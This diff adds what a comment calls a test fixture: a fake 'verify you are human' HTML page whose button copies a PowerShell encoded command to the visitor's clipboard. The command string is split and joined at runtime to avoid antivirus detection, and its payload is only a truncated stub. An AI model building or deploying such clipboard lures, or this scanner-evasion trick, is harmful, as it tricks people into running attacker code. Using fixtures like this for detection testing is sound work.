@@ -1,0 +1,11 @@
+<!doctype html><meta charset="utf-8"><title>Verify you are human</title>
+<h1>Press the button to verify</h1>
+<button id="c">Copy verification code</button>
+<script>
+  // Payload assembled at runtime so the fixture file on disk does not contain a
+  // literal command string (which local antivirus would quarantine).
+  var payload = ['power', 'shell', ' -en', 'c', ' SQBFAFgA'].join('');
+  document.getElementById('c').onclick = () => {
+    try { navigator.clipboard.writeText(payload); } catch (e) {}
+  };
+</script>
